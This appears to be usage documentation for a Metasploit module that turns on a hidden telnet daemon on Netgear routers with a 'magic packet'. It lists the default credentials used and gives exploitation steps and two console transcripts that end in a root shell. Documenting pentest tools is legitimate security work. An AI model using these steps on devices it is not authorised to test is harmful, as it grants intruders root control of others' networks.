## Introduction

Several models of Netgear devices have a hidden telnet daemon that can be
enabled for remote LAN users by sending a 'magic packet' to the device. 
Upon successful connect, a root shell should be presented to the user.

There are many devices which contain this daemon, for a full list see [OpenWrt](https://wiki.openwrt.org/toh/netgear/telnet.console).

This module has been successfully tested against:

 - AC1450 - unknown older firmware (TCP)
 - AC1450 - latest firmware: V1.0.0.36_10.0.17 (UDP)
 - N300 WNR2000 v3 - firmware: V1.1.2.10 (TCP)

## Setup

A MAC address is required for exploitation.  To determine the MAC address of the device:

1. Ping the device to force an ARP lookup: ```ping -c 1 [IP]```
2. Get the MAC: ```arp -an [IP]```

If you are the root user, you can skip this step. ARP will be leveraged
to find the MAC address.

## Targets

**0 (Automatic)**

Detect if a device listens on TCP or UDP.

**1 (TCP)**

Older devices usually listen on TCP.

**2 (UDP)**

Newer devices usually listen on UDP.

## Options

**MAC**

Set this to the MAC address of the device. You can use `ping` and `arp`
to find it.

You can leave this blank if you're root.

**USERNAME**

If this is an older device, it'll take the value of `super_username` in
`nvram`, which is usually unchanged from `Gearguy`.

If this is a newer device, it'll take the web UI username, which is
usually unchanged from `admin`.

You can leave this blank to use the default username.

**PASSWORD**

If this is an older device, it'll take the value of `super_passwd` in
`nvram`, which is usually unchanged from `Geardog`.

If this is a newer device, it'll take the web UI password, which is
usually unchanged from `password`.

You can leave this blank to use the default password.

## Exploitation 

1. Make sure you have a vulnerable device
2. Start metasploit
3. ```use exploit/linux/telnet/netgear_telnetenable```
4. ```set rhost [IP]```
5. ```set mac [MAC Address]``` if not running as root
6. ```exploit```
7. Enjoy a root shell!

## Usage

### AC1450

As a normal user:

```
msf5 > use exploit/linux/telnet/netgear_telnetenable
msf5 exploit(linux/telnet/netgear_telnetenable) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf5 exploit(linux/telnet/netgear_telnetenable) > ping -c 1 192.168.1.1
[*] exec: ping -c 1 192.168.1.1

PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=2.04 ms

--- 192.168.1.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.041/2.041/2.041/0.000 ms
msf5 exploit(linux/telnet/netgear_telnetenable) > arp -an 192.168.1.1
[*] exec: arp -an 192.168.1.1

? (192.168.1.1) at [redacted] [ether] on wlan0
msf5 exploit(linux/telnet/netgear_telnetenable) > set mac [redacted]
mac => [redacted]
msf5 exploit(linux/telnet/netgear_telnetenable) > run

[+] 192.168.1.1:23 - Detected telnetenabled on UDP
[+] 192.168.1.1:23 - Using creds admin:password
[*] 192.168.1.1:23 - Generating magic packet
[*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
[*] 192.168.1.1:23 - Sending magic packet
[*] 192.168.1.1:23 - Disconnecting from telnetenabled
[*] 192.168.1.1:23 - Waiting for telnetd
[*] 192.168.1.1:23 - Connecting to telnetd
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.3:34833 -> 192.168.1.1:23) at 2018-03-02 19:26:25 -0600

id
id
uid=0 gid=0(root)
# uname -a
uname -a
Linux (none) 2.6.36.4brcmarm+ #16 SMP PREEMPT Wed Mar 22 15:02:38 CST 2017 armv7l unknown
#
```

As root:

```
msf5 > use exploit/linux/telnet/netgear_telnetenable
msf5 exploit(linux/telnet/netgear_telnetenable) > set rhost 192.168.1.1
rhost => 192.168.1.1
rmsf5 exploit(linux/telnet/netgear_telnetenable) > run

[+] 192.168.1.1:23 - Detected telnetenabled on UDP
[*] 192.168.1.1:23 - Attempting to discover MAC address via ARP
[+] 192.168.1.1:23 - Found MAC address [redacted]
[+] 192.168.1.1:23 - Using creds admin:password
[*] 192.168.1.1:23 - Generating magic packet
[*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
[*] 192.168.1.1:23 - Sending magic packet
[*] 192.168.1.1:23 - Disconnecting from telnetenabled
[*] 192.168.1.1:23 - Waiting for telnetd
[*] 192.168.1.1:23 - Connecting to telnetd
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.2:37771 -> 192.168.1.1:23) at 2018-03-02 19:33:42 -0600

id
id
uid=0 gid=0(root)
# uname -a
uname -a
Linux (none) 2.6.36.4brcmarm+ #16 SMP PREEMPT Wed Mar 22 15:02:38 CST 2017 armv7l unknown
#
```
